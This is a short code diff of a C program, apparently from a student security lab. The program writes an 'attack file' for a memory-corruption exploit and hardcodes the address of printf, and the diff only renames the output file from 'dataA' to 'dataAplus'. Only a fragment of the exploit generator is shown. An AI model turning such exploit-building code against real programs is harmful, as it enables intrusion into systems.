@@ -24,7 +24,7 @@ int main(void)
     const unsigned long PRINTF_ADDR = 0x400690; /* Start of printf */
 
     /* 1) Open the attack file for binary write */
-    f = fopen("dataA", "w");
+    f = fopen("dataAplus", "w");
     fprintf(f, "%s", "OwenAndBen");
 
     for (i = 0; i < 2; i++)
